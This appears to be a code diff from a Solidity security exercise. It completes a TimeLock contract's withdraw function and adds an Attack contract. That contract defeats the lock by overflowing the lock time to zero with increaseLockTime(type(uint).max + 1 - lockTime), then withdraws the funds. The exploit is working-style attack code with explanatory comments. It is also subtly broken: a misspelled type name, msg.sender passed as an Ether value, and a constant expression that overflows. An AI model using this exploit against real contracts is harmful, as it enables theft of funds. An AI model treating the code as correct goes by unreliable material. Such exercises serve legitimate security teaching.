@@ -31,6 +31,33 @@ contract TimeLock {
     require(balances[msg.sender] > 0, "Insufficient funds");
     require(block.timestamp > lockTime[msg.sender], "Lock time not expired");
 
-    
+		uint amount = balances[msg.sender];
+		balances[msg.sender] = 0;
+
+		(bool sent, ) = msg.sender.call{value: amount}("");
+		require(sent, "Failed to send Ether");
   }
+}
+
+contract Attack {
+	TimeLock timeLock;
+
+	constructor(Timelock _timeLock) {
+		timeLock = TimeLock(_timeLock);
+	}
+
+	fallback() external payable {}
+
+	function attack() public payable {
+		timeLock.deposit{value:msg.sender}();
+		/*
+		if t = current lock time then we need to find x such that
+		x + t = 2**256 = 0
+		so x = -t
+		2**256 = type(uint).max + 1
+		so x = type(uint).max + 1 - t
+		*/
+		timeLock.increaseLockTime(type(uint).max + 1 - timeLock.lockTime(address(this)));
+		timeLock.withdraw();
+	}
 }
